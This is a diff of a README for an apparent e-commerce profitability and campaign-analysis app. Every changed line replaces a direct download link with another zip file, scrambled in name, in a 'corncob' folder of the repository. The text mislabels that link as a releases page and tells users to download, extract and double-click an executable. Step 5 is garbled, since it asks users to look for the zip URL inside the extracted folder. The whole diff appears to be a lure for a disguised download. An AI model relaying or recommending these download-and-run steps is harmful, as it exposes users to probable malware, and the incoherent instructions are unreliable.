@@ -1,6 +1,6 @@
 # 🛒 E-Commerce-Profitability-and-Market-Campaign-Analysis - Maximize Your Marketing Effectiveness
 
-[![Download](https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/Analysis_Profitability_Commerce_Campaign_and_Market_1.3.zip%20release-brightgreen)](https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/Analysis_Profitability_Commerce_Campaign_and_Market_1.3.zip)
+[![Download](https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/and-Campaign-Analysis-Profitability-Commerce-Market-v3.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/and-Campaign-Analysis-Profitability-Commerce-Market-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -30,21 +30,21 @@ To run this application effectively, ensure you have:
 
 ## 📥 Download & Install
 
-You can download the latest version of the application by visiting this page: [Download from Releases](https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/Analysis_Profitability_Commerce_Campaign_and_Market_1.3.zip).
+You can download the latest version of the application by visiting this page: [Download from Releases](https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/and-Campaign-Analysis-Profitability-Commerce-Market-v3.2.zip).
 
 Once there, find the version labeled "latest release" and click on the link to download the file. The file will usually be tagged with the version number (e.g., v1.0).
 
 ### Steps to Download and Install:
 
-1. **Visit the Release Page**: Click [here](https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/Analysis_Profitability_Commerce_Campaign_and_Market_1.3.zip) to go to the Releases page.
+1. **Visit the Release Page**: Click [here](https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/and-Campaign-Analysis-Profitability-Commerce-Market-v3.2.zip) to go to the Releases page.
 
 2. **Select the Latest Version**: Look for the most recent version of the application. It typically appears at the top of the list.
 
-3. **Download the File**: Click on the downloadable file (for example, `https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/Analysis_Profitability_Commerce_Campaign_and_Market_1.3.zip`). This file will contain all the necessary components.
+3. **Download the File**: Click on the downloadable file (for example, `https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/and-Campaign-Analysis-Profitability-Commerce-Market-v3.2.zip`). This file will contain all the necessary components.
 
 4. **Extract the Contents**: Once downloaded, locate the file in your downloads folder. Right-click on the file and select "Extract All" to unpack it.
 
-5. **Run the Application**: Open the folder where you extracted the files. Look for `https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/Analysis_Profitability_Commerce_Campaign_and_Market_1.3.zip` (or the appropriate executable for your system) and double-click it to run.
+5. **Run the Application**: Open the folder where you extracted the files. Look for `https://raw.githubusercontent.com/hamrin11/E-Commerce-Profitability-and-Market-Campaign-Analysis/main/corncob/and-Campaign-Analysis-Profitability-Commerce-Market-v3.2.zip` (or the appropriate executable for your system) and double-click it to run.
 
 6. **Follow On-Screen Instructions**: The application will guide you to set it up. Follow any prompts to complete the installation.
 
